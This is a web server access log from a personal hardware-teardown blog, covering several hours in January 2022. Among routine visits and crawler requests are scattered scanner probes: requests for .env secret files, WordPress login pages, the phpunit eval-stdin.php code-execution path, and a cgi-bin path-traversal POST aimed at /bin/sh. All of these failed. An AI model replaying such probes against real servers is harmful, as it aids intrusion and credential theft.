84.78.158.244 - - [03/Jan/2022:22:40:38 +0000] "GET /favicon.ico HTTP/1.1" 404 209
50.116.54.8 - - [03/Jan/2022:22:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
8.29.198.25 - - [03/Jan/2022:22:44:25 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
189.142.113.179 - - [03/Jan/2022:22:46:02 +0000] "GET /blog/2019/10/18/Ethereum_Mining_on_Raspberry_Pi_4.html HTTP/1.1" 200 2236
189.142.113.179 - - [03/Jan/2022:22:46:03 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
189.142.113.179 - - [03/Jan/2022:22:46:04 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
189.142.113.179 - - [03/Jan/2022:22:46:04 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
189.142.113.179 - - [03/Jan/2022:22:46:04 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
189.142.113.179 - - [03/Jan/2022:22:46:04 +0000] "GET /favicon.ico HTTP/1.1" 404 209
189.142.113.179 - - [03/Jan/2022:22:46:05 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
189.142.113.179 - - [03/Jan/2022:22:46:05 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
189.142.113.179 - - [03/Jan/2022:22:46:05 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
189.142.113.179 - - [03/Jan/2022:22:46:05 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
189.142.113.179 - - [03/Jan/2022:22:46:06 +0000] "GET /favicon.ico HTTP/1.1" 404 209
114.119.129.143 - - [03/Jan/2022:22:48:42 +0000] "GET /blog/tags/hyperthreading.html HTTP/1.1" 200 526
185.191.171.39 - - [03/Jan/2022:22:49:08 +0000] "GET /robots.txt HTTP/1.1" 404 208
185.191.171.42 - - [03/Jan/2022:22:49:09 +0000] "GET /blog/tags/Atari%20Flashback.html HTTP/1.1" 200 708
20.191.45.212 - - [03/Jan/2022:22:49:09 +0000] "GET / HTTP/1.1" 200 97
20.191.45.212 - - [03/Jan/2022:22:49:09 +0000] "GET /favicon.ico HTTP/1.1" 404 209
20.191.45.212 - - [03/Jan/2022:22:49:09 +0000] "GET /favicon.ico HTTP/1.1" 404 209
87.251.85.227 - - [03/Jan/2022:22:49:22 +0000] "GET /wp-info.php HTTP/1.1" 404 209
8.29.198.25 - - [03/Jan/2022:22:51:38 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
80.7.129.134 - - [03/Jan/2022:22:51:54 +0000] "GET /blog/2020/7/3/Installing_Debian_10_on_a_PowerMac_G5.html HTTP/1.1" 200 9036
80.7.129.134 - - [03/Jan/2022:22:51:54 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
80.7.129.134 - - [03/Jan/2022:22:51:54 +0000] "GET /favicon.ico HTTP/1.1" 404 209
172.224.226.89 - - [03/Jan/2022:22:55:19 +0000] "GET /blog/2015/4/19/WiFi_Yagi_SWR_Shootout.html HTTP/1.1" 200 12116
172.224.226.89 - - [03/Jan/2022:22:55:19 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
172.224.226.89 - - [03/Jan/2022:22:55:21 +0000] "GET /favicon.ico HTTP/1.1" 404 209
172.224.226.89 - - [03/Jan/2022:22:55:42 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
172.224.226.89 - - [03/Jan/2022:22:55:42 +0000] "GET /favicon.ico HTTP/1.1" 404 209
172.224.226.89 - - [03/Jan/2022:22:55:43 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
87.251.85.227 - - [03/Jan/2022:22:55:45 +0000] "GET /wp-info.php HTTP/1.1" 404 209
172.224.226.89 - - [03/Jan/2022:22:55:45 +0000] "GET /blog/2015/4/19/WiFi_Yagi_SWR_Shootout.html HTTP/1.1" 200 12116
172.224.226.93 - - [03/Jan/2022:22:55:46 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
172.224.226.93 - - [03/Jan/2022:22:55:46 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
172.224.226.93 - - [03/Jan/2022:22:55:46 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
172.224.226.93 - - [03/Jan/2022:22:55:46 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
172.224.226.93 - - [03/Jan/2022:22:55:47 +0000] "GET /favicon.ico HTTP/1.1" 404 209
172.224.226.93 - - [03/Jan/2022:22:55:47 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
172.224.226.93 - - [03/Jan/2022:22:55:47 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
172.224.226.93 - - [03/Jan/2022:22:55:47 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
172.224.226.93 - - [03/Jan/2022:22:55:47 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
172.224.226.93 - - [03/Jan/2022:22:55:47 +0000] "GET /favicon.ico HTTP/1.1" 404 209
45.146.165.37 - - [03/Jan/2022:22:56:06 +0000] "GET / HTTP/1.1" 200 97
8.29.198.27 - - [03/Jan/2022:22:58:43 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
157.90.209.81 - - [03/Jan/2022:23:01:47 +0000] "GET /robots.txt HTTP/1.1" 404 208
146.115.91.190 - - [03/Jan/2022:23:02:13 +0000] "GET /blog/2019/10/18/Ethereum_Mining_on_Raspberry_Pi_4.html HTTP/1.1" 200 2236
146.115.91.190 - - [03/Jan/2022:23:02:14 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
146.115.91.190 - - [03/Jan/2022:23:02:14 +0000] "GET /favicon.ico HTTP/1.1" 404 209
185.225.39.112 - - [03/Jan/2022:23:05:49 +0000] "GET /scripts/app.js HTTP/1.1" 404 212
8.29.198.25 - - [03/Jan/2022:23:05:51 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
20.191.45.212 - - [03/Jan/2022:23:07:56 +0000] "GET / HTTP/1.1" 200 97
20.191.45.212 - - [03/Jan/2022:23:07:56 +0000] "GET /favicon.ico HTTP/1.1" 404 209
20.191.45.212 - - [03/Jan/2022:23:07:56 +0000] "GET /favicon.ico HTTP/1.1" 404 209
40.77.167.26 - - [03/Jan/2022:23:11:04 +0000] "GET / HTTP/1.1" 200 97
17.121.114.140 - - [03/Jan/2022:23:11:26 +0000] "GET /blog/2018/12/4/Taking_Apart_the_Caldwell_Ballistic_Precision_Chronograph.html HTTP/1.1" 200 3259
8.29.198.26 - - [03/Jan/2022:23:13:01 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.115 - - [03/Jan/2022:23:13:50 +0000] "GET /blog/2009/9/24/OISC_Hardware:_Program_Counter.html HTTP/1.1" 404 248
92.53.22.39 - - [03/Jan/2022:23:14:12 +0000] "GET /blog/2016/12/6/Scanning_for_mobile_devices_running_Netflix.html HTTP/1.1" 200 3607
92.53.22.39 - - [03/Jan/2022:23:14:12 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
92.53.22.39 - - [03/Jan/2022:23:14:12 +0000] "GET /favicon.ico HTTP/1.1" 404 209
128.1.248.42 - - [03/Jan/2022:23:16:32 +0000] "GET / HTTP/1.1" 200 97
114.119.129.148 - - [03/Jan/2022:23:19:25 +0000] "GET /blog/tags/Blogging.html HTTP/1.1" 200 500
8.29.198.26 - - [03/Jan/2022:23:20:12 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
185.191.171.44 - - [03/Jan/2022:23:22:34 +0000] "GET /blog/tags/Verizon.html HTTP/1.1" 200 1305
114.119.129.143 - - [03/Jan/2022:23:25:08 +0000] "GET /blog/tags/Minnesota.html HTTP/1.1" 200 535
92.247.181.9 - - [03/Jan/2022:23:25:09 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
146.115.91.190 - - [03/Jan/2022:23:27:27 +0000] "GET /blog/2019/10/18/Ethereum_Mining_on_Raspberry_Pi_4.html HTTP/1.1" 304 -
8.29.198.27 - - [03/Jan/2022:23:27:32 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
146.115.91.190 - - [03/Jan/2022:23:27:48 +0000] "-" 408 -
54.36.148.109 - - [03/Jan/2022:23:34:33 +0000] "GET /blog/2019/11/13/Repairing_my_JVC_GY-HM700_after_blowing_a_fuse.html HTTP/1.1" 200 2303
8.29.198.25 - - [03/Jan/2022:23:34:36 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
66.249.66.130 - - [03/Jan/2022:23:37:58 +0000] "GET /blog/2015/12/14/GreaseGun_Valve_Teardown.html HTTP/1.1" 200 5805
45.79.148.82 - - [03/Jan/2022:23:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
8.29.198.27 - - [03/Jan/2022:23:41:52 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
8.29.198.26 - - [03/Jan/2022:23:48:58 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
185.191.171.20 - - [03/Jan/2022:23:49:31 +0000] "GET /robots.txt HTTP/1.1" 404 208
185.191.171.39 - - [03/Jan/2022:23:49:31 +0000] "GET /blog/tags/Bus.html HTTP/1.1" 200 554
45.146.165.37 - - [03/Jan/2022:23:51:27 +0000] "GET / HTTP/1.1" 200 97
8.29.198.25 - - [03/Jan/2022:23:56:11 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
66.249.66.8 - - [03/Jan/2022:23:58:02 +0000] "GET /blog/tags/Disassembly.html HTTP/1.1" 200 583
136.243.17.161 - - [03/Jan/2022:23:59:00 +0000] "GET /blog/2008/5/26/A_New_Home.html HTTP/1.1" 200 5326
54.36.148.109 - - [03/Jan/2022:23:59:45 +0000] "GET /blog/tags/Electret.html HTTP/1.1" 200 564
123.149.77.199 - - [04/Jan/2022:00:00:29 +0000] "GET /robots.txt HTTP/1.1" 404 208
207.46.13.18 - - [04/Jan/2022:00:01:57 +0000] "GET / HTTP/1.1" 200 97
8.29.198.27 - - [04/Jan/2022:00:03:24 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
114.119.129.143 - - [04/Jan/2022:00:09:13 +0000] "GET /blog/2011/2/3/Samsung__Verizon_SCS-2U01_GPS_Captures.html HTTP/1.1" 200 1974
8.29.198.27 - - [04/Jan/2022:00:10:35 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
64.99.224.102 - - [04/Jan/2022:00:11:10 +0000] "GET /blog/2021/10/31/Casa_Systems_B41_Femtocell_Console_and_Fastboot.html HTTP/1.1" 200 42408
64.99.224.102 - - [04/Jan/2022:00:11:10 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
64.99.224.102 - - [04/Jan/2022:00:11:11 +0000] "GET /favicon.ico HTTP/1.1" 404 209
64.99.224.102 - - [04/Jan/2022:00:12:06 +0000] "GET /blog/2021/11/26/Disassembling_Lacie_5Big_Nas_Pro_and_adding_a_USB_drive.html HTTP/1.1" 200 6886
64.99.224.102 - - [04/Jan/2022:00:12:20 +0000] "GET /blog/tags/UART.html HTTP/1.1" 200 1576
64.99.224.102 - - [04/Jan/2022:00:12:30 +0000] "GET /blog/2013/12/21/Detuning_one_UART_to_match_another.html HTTP/1.1" 200 1832
64.99.224.102 - - [04/Jan/2022:00:12:39 +0000] "GET /blog/2016/4/6/GoogleFiberNetworkBoxShell.html HTTP/1.1" 200 1536
64.99.224.102 - - [04/Jan/2022:00:12:46 +0000] "GET /blog/2020/8/12/Google_Fiber_Jack_Shell_and_GPON_Configuration.html HTTP/1.1" 200 4580
8.29.198.26 - - [04/Jan/2022:00:17:47 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.147 - - [04/Jan/2022:00:20:06 +0000] "GET /blog/2020/8/15/Inside_a_PON_Splitter.html HTTP/1.1" 200 2117
193.27.14.216 - - [04/Jan/2022:00:23:42 +0000] "GET /.env HTTP/1.1" 404 202
193.27.14.216 - - [04/Jan/2022:00:23:42 +0000] "POST / HTTP/1.1" 200 97
84.78.158.244 - - [04/Jan/2022:00:23:52 +0000] "GET /favicon.ico HTTP/1.1" 404 209
92.247.181.9 - - [04/Jan/2022:00:25:13 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
8.29.198.27 - - [04/Jan/2022:00:25:14 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
54.36.148.109 - - [04/Jan/2022:00:26:58 +0000] "GET /blog/2011/9/25/PPPRS_launches_Kickstarter.html HTTP/1.1" 200 1715
66.249.66.18 - - [04/Jan/2022:00:27:01 +0000] "GET /robots.txt HTTP/1.1" 404 208
66.249.66.134 - - [04/Jan/2022:00:27:01 +0000] "GET /blog/2015/12/14/GreaseGun_Valve_Teardown.html HTTP/1.1" 200 5805
207.46.13.50 - - [04/Jan/2022:00:30:20 +0000] "GET / HTTP/1.1" 200 97
200.68.128.179 - - [04/Jan/2022:00:30:59 +0000] "GET /blog/2020/7/3/Installing_Debian_10_on_a_PowerMac_G5.html HTTP/1.1" 200 9036
200.68.128.179 - - [04/Jan/2022:00:31:01 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
200.68.128.179 - - [04/Jan/2022:00:31:02 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
200.68.128.179 - - [04/Jan/2022:00:31:02 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
200.68.128.179 - - [04/Jan/2022:00:31:02 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
200.68.128.179 - - [04/Jan/2022:00:31:03 +0000] "GET /favicon.ico HTTP/1.1" 404 209
200.68.128.179 - - [04/Jan/2022:00:31:03 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
200.68.128.179 - - [04/Jan/2022:00:31:03 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
200.68.128.179 - - [04/Jan/2022:00:31:03 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
200.68.128.179 - - [04/Jan/2022:00:31:03 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
200.68.128.179 - - [04/Jan/2022:00:31:04 +0000] "GET /favicon.ico HTTP/1.1" 404 209
8.29.198.26 - - [04/Jan/2022:00:32:19 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.143.152 - - [04/Jan/2022:00:33:05 +0000] "GET /blog/tags/RLE.html HTTP/1.1" 200 555
109.194.243.36 - - [04/Jan/2022:00:34:43 +0000] "GET / HTTP/1.0" 200 97
192.141.93.50 - - [04/Jan/2022:00:34:58 +0000] "GET /blog/2021/7/15/Installing_Magisk_on_Raspberry_Pi_4_OmniROM_Android_11.html HTTP/1.1" 200 5974
192.141.93.50 - - [04/Jan/2022:00:34:59 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
192.141.93.50 - - [04/Jan/2022:00:34:59 +0000] "GET /favicon.ico HTTP/1.1" 404 209
8.29.198.25 - - [04/Jan/2022:00:39:26 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
97.107.132.77 - - [04/Jan/2022:00:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
66.249.66.134 - - [04/Jan/2022:00:41:56 +0000] "GET /blog/2010/7/21/Cricut_USB_Protocol_Reversed.html HTTP/1.1" 200 2469
66.249.66.210 - - [04/Jan/2022:00:42:03 +0000] "GET /ads.txt HTTP/1.1" 404 205
8.29.198.27 - - [04/Jan/2022:00:46:42 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
91.151.89.181 - - [04/Jan/2022:00:48:03 +0000] "GET /app/.env HTTP/1.1" 404 206
114.119.129.113 - - [04/Jan/2022:00:49:47 +0000] "GET /blog/tags/Data%20structure.html HTTP/1.1" 200 597
8.29.198.25 - - [04/Jan/2022:00:53:50 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
54.36.148.109 - - [04/Jan/2022:00:54:48 +0000] "GET /blog/2017/4/2/Project_Goals_for_2017.html HTTP/1.1" 200 2354
45.146.165.37 - - [04/Jan/2022:00:54:59 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226
5.161.66.110 - - [04/Jan/2022:00:55:03 +0000] "GET /blog/2016/12/6/Scanning_for_mobile_devices_running_Netflix.html HTTP/1.1" 200 3607
91.202.45.27 - - [04/Jan/2022:00:59:51 +0000] "GET /wp-login.php?action=register HTTP/1.1" 404 210
8.29.198.25 - - [04/Jan/2022:01:01:01 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
114.119.129.14 - - [04/Jan/2022:01:03:04 +0000] "GET /blog/tags/Toyota.html HTTP/1.1" 200 969
66.249.66.16 - - [04/Jan/2022:01:03:22 +0000] "GET /blog/2016/12/28/DroneView_WiFi_Camera.html HTTP/1.1" 200 3762
8.29.198.27 - - [04/Jan/2022:01:08:08 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.128 - - [04/Jan/2022:01:08:40 +0000] "GET /blog/2011/4/21/Litronic_Argus_2202_PCMCIA_Teardown.html HTTP/1.1" 200 2402
114.119.129.128 - - [04/Jan/2022:01:14:16 +0000] "GET /blog/tags/hack.html HTTP/1.1" 200 567
8.29.198.26 - - [04/Jan/2022:01:15:21 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
67.168.102.56 - - [04/Jan/2022:01:18:00 +0000] "GET /favicon.ico HTTP/1.1" 404 209
8.29.198.26 - - [04/Jan/2022:01:22:22 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
185.191.171.25 - - [04/Jan/2022:01:22:35 +0000] "GET /robots.txt HTTP/1.1" 404 208
185.191.171.7 - - [04/Jan/2022:01:22:35 +0000] "GET /blog/tags/Encryption.html HTTP/1.1" 200 549
66.249.66.130 - - [04/Jan/2022:01:24:48 +0000] "GET /blog/2011/2/16/My_Favorite_64-bit_Porting_Guide.html HTTP/1.1" 200 2511
54.36.148.109 - - [04/Jan/2022:01:24:50 +0000] "GET /blog/2020/4/10/Widespread_re-use_of_SSH_Host_Keys_in_Ethereum_Mining_Rig_Operating_Systems.html HTTP/1.1" 200 7955
92.247.181.9 - - [04/Jan/2022:01:27:06 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
8.29.198.26 - - [04/Jan/2022:01:29:30 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.147 - - [04/Jan/2022:01:30:49 +0000] "GET /blog/tags/Mobile%20computing.html HTTP/1.1" 200 612
185.191.171.3 - - [04/Jan/2022:01:31:14 +0000] "GET /blog/tags/VxWorks.html HTTP/1.1" 200 564
8.29.198.26 - - [04/Jan/2022:01:36:50 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
66.249.66.20 - - [04/Jan/2022:01:39:43 +0000] "GET /blog/2013/7/28/Taking_Apart_the_Monoprice_3G_USB_WiFi_Router.html HTTP/1.1" 200 3866
97.107.132.77 - - [04/Jan/2022:01:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
114.119.129.113 - - [04/Jan/2022:01:42:54 +0000] "GET /blog/tags/Security.html HTTP/1.1" 200 662
8.29.198.26 - - [04/Jan/2022:01:43:59 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
35.166.248.200 - - [04/Jan/2022:01:44:36 +0000] "GET / HTTP/1.1" 200 97
66.249.66.16 - - [04/Jan/2022:01:46:13 +0000] "GET /blog/tags/Boomerang%20(decompiler).html HTTP/1.1" 200 582
185.191.171.10 - - [04/Jan/2022:01:50:54 +0000] "GET /blog/2011/7/25/boot-animator_part2_Command-Line_flags.html HTTP/1.1" 200 1926
8.29.198.25 - - [04/Jan/2022:01:51:13 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
77.35.230.150 - - [04/Jan/2022:01:53:25 +0000] "GET /blog/2020/8/15/Nokia_G-010S-A_Pin_6_Issue.html HTTP/1.1" 200 5159
77.35.230.150 - - [04/Jan/2022:01:53:25 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
77.35.230.150 - - [04/Jan/2022:01:53:27 +0000] "GET /favicon.ico HTTP/1.1" 404 209
77.35.230.150 - - [04/Jan/2022:01:54:29 +0000] "-" 408 -
77.35.230.150 - - [04/Jan/2022:01:54:29 +0000] "-" 408 -
8.29.198.25 - - [04/Jan/2022:01:58:18 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
114.119.129.115 - - [04/Jan/2022:02:02:56 +0000] "GET /blog/2016/1/3/PeltierControllerOverview.html HTTP/1.1" 200 7672
114.119.133.42 - - [04/Jan/2022:02:03:06 +0000] "GET /blog/2016/4/6/GoogleFiberNetworkBoxBootloader.html HTTP/1.1" 200 2502
8.29.198.27 - - [04/Jan/2022:02:05:21 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
185.225.39.112 - - [04/Jan/2022:02:05:39 +0000] "GET /scripts/app.js HTTP/1.1" 404 212
185.191.171.10 - - [04/Jan/2022:02:06:41 +0000] "GET /blog/2010/11/23/New_Neighbors.html HTTP/1.1" 200 2904
66.249.66.154 - - [04/Jan/2022:02:07:39 +0000] "GET /robots.txt HTTP/1.1" 404 208
66.249.66.206 - - [04/Jan/2022:02:07:40 +0000] "GET /blog/2015/ HTTP/1.1" 200 2122
114.119.129.148 - - [04/Jan/2022:02:09:25 +0000] "GET /blog/2011/2/3/You_stay_away_from_here!.html HTTP/1.1" 200 2263
8.29.198.26 - - [04/Jan/2022:02:12:31 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.148 - - [04/Jan/2022:02:15:06 +0000] "GET /blog/tags/Televerge.html HTTP/1.1" 200 566
220.181.108.121 - - [04/Jan/2022:02:15:43 +0000] "GET /blog/ HTTP/1.1" 200 91741
220.181.108.114 - - [04/Jan/2022:02:15:45 +0000] "GET /blog/ HTTP/1.1" 200 91741
146.115.91.190 - - [04/Jan/2022:02:16:23 +0000] "-" 408 -
146.115.91.190 - - [04/Jan/2022:02:16:23 +0000] "-" 408 -
114.119.133.26 - - [04/Jan/2022:02:18:33 +0000] "GET /blog/2015/12/14/GreaseGun_Valve_Teardown.html HTTP/1.1" 200 5805
8.29.198.25 - - [04/Jan/2022:02:19:39 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.148 - - [04/Jan/2022:02:23:26 +0000] "GET /blog/tags/Pickin'%20Sticks.html HTTP/1.1" 200 670
68.200.60.183 - - [04/Jan/2022:02:24:38 +0000] "GET /blog/2018/12/4/Taking_Apart_the_Caldwell_Ballistic_Precision_Chronograph.html HTTP/1.1" 200 3259
68.200.60.183 - - [04/Jan/2022:02:24:38 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
68.200.60.183 - - [04/Jan/2022:02:24:38 +0000] "GET /favicon.ico HTTP/1.1" 404 209
68.200.60.183 - - [04/Jan/2022:02:24:50 +0000] "GET /blog/2018/12/4/Caldwell_Ballistic_Precision_Chronograph_Theory_of_Operation_and_Signal_Path.html HTTP/1.1" 200 8492
68.200.60.183 - - [04/Jan/2022:02:25:37 +0000] "GET /blog/2019/3/23/Opening_Your_Sprint_Magic_Box.html HTTP/1.1" 200 2445
68.200.60.183 - - [04/Jan/2022:02:25:53 +0000] "GET /blog/2019/3/23/Sprint_Magic_Box_Serial_Logs.html HTTP/1.1" 200 12365
8.29.198.26 - - [04/Jan/2022:02:26:48 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
66.102.6.125 - - [04/Jan/2022:02:26:50 +0000] "GET /favicon.ico HTTP/1.1" 404 209
92.247.181.9 - - [04/Jan/2022:02:27:44 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
66.249.66.88 - - [04/Jan/2022:02:29:06 +0000] "GET /blog/tags/Boomerang%20(decompiler).html HTTP/1.1" 200 582
207.46.13.18 - - [04/Jan/2022:02:29:20 +0000] "GET / HTTP/1.1" 304 -
45.146.165.37 - - [04/Jan/2022:02:29:36 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 248
17.121.114.27 - - [04/Jan/2022:02:32:04 +0000] "GET /blog/tags/Chicago.html HTTP/1.1" 200 789
114.119.129.115 - - [04/Jan/2022:02:33:32 +0000] "GET /blog/tags/Bozeman.html HTTP/1.1" 200 531
8.29.198.25 - - [04/Jan/2022:02:33:59 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
5.255.253.120 - - [04/Jan/2022:02:34:06 +0000] "GET /robots.txt HTTP/1.1" 404 208
5.255.253.120 - - [04/Jan/2022:02:34:10 +0000] "GET /radiomap/opmap.html HTTP/1.1" 404 217
213.180.203.98 - - [04/Jan/2022:02:35:09 +0000] "GET /radiomap/opmap.html HTTP/1.1" 404 217
185.191.171.3 - - [04/Jan/2022:02:39:05 +0000] "GET /robots.txt HTTP/1.1" 404 208
185.191.171.25 - - [04/Jan/2022:02:39:05 +0000] "GET /blog/tags/U-Verse.html HTTP/1.1" 200 704
114.119.129.113 - - [04/Jan/2022:02:39:06 +0000] "GET /blog/2017/10/21/Linduino.html HTTP/1.1" 200 2599
8.29.198.27 - - [04/Jan/2022:02:41:07 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
50.116.54.8 - - [04/Jan/2022:02:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
189.242.40.105 - - [04/Jan/2022:02:43:06 +0000] "GET /blog/2020/7/3/Installing_Debian_10_on_a_PowerMac_G5.html HTTP/1.1" 200 9036
189.242.40.105 - - [04/Jan/2022:02:43:08 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
189.242.40.105 - - [04/Jan/2022:02:43:08 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
189.242.40.105 - - [04/Jan/2022:02:43:08 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
189.242.40.105 - - [04/Jan/2022:02:43:08 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
189.242.40.105 - - [04/Jan/2022:02:43:09 +0000] "GET /favicon.ico HTTP/1.1" 404 209
189.242.40.105 - - [04/Jan/2022:02:43:09 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
189.242.40.105 - - [04/Jan/2022:02:43:09 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
189.242.40.105 - - [04/Jan/2022:02:43:09 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
189.242.40.105 - - [04/Jan/2022:02:43:09 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
189.242.40.105 - - [04/Jan/2022:02:43:09 +0000] "GET /favicon.ico HTTP/1.1" 404 209
114.119.129.147 - - [04/Jan/2022:02:44:49 +0000] "GET /blog/2012/1/2/GamePickin_Duino.html HTTP/1.1" 200 3033
144.91.83.189 - - [04/Jan/2022:02:46:57 +0000] "GET /robots.txt HTTP/1.1" 404 208
144.91.83.189 - - [04/Jan/2022:02:47:09 +0000] "GET /blog/ HTTP/1.1" 200 91741
8.29.198.26 - - [04/Jan/2022:02:48:20 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
157.55.39.169 - - [04/Jan/2022:02:50:00 +0000] "GET /robots.txt HTTP/1.1" 404 208
157.55.39.182 - - [04/Jan/2022:02:50:09 +0000] "GET /blog/2021/1/9/2002_Toyota_Highlander_Mid_Dome_Light_Access.html HTTP/1.1" 200 4776
114.119.129.143 - - [04/Jan/2022:02:52:48 +0000] "GET /blog/2016/8/21/SecKCoin_Bulk_Mining.html HTTP/1.1" 200 2091
66.249.66.88 - - [04/Jan/2022:02:53:08 +0000] "GET /robots.txt HTTP/1.1" 404 208
66.249.66.132 - - [04/Jan/2022:02:53:09 +0000] "GET /blog/tags/teardown.html HTTP/1.1" 200 1340
123.125.109.178 - - [04/Jan/2022:02:54:21 +0000] "GET / HTTP/1.1" 200 97
8.29.198.27 - - [04/Jan/2022:02:55:30 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
45.146.165.37 - - [04/Jan/2022:02:58:08 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 248
123.125.109.178 - - [04/Jan/2022:02:59:36 +0000] "GET /blog/ HTTP/1.1" 200 91741
185.191.171.18 - - [04/Jan/2022:03:02:01 +0000] "GET /blog/2019/3/23/Sprint_Magic_Box_Serial_Logs.html HTTP/1.1" 200 12365
114.119.129.128 - - [04/Jan/2022:03:02:18 +0000] "GET /blog/2011/7/17/boot-animator_convert_videos_to_android_boot_animations.html HTTP/1.1" 200 1995
8.29.198.27 - - [04/Jan/2022:03:02:36 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
17.121.113.197 - - [04/Jan/2022:03:07:22 +0000] "GET /blog/tags/Nexenta%20OS.html HTTP/1.1" 200 588
114.119.129.128 - - [04/Jan/2022:03:07:49 +0000] "GET /blog/tags/Cortex-M.html HTTP/1.1" 200 600
131.220.6.152 - - [04/Jan/2022:03:08:12 +0000] "GET / HTTP/1.1" 200 97
8.29.198.26 - - [04/Jan/2022:03:09:43 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
66.249.66.156 - - [04/Jan/2022:03:10:20 +0000] "GET /blog/2008/6/10/JAUS:_a_testament_to_poor_design_and_early_adoption.html HTTP/1.1" 404 269
200.229.216.114 - - [04/Jan/2022:03:11:03 +0000] "GET /blog/2016/12/6/Scanning_for_mobile_devices_running_Netflix.html HTTP/1.1" 200 3607
200.229.216.114 - - [04/Jan/2022:03:11:03 +0000] "GET /robots.txt HTTP/1.1" 404 208
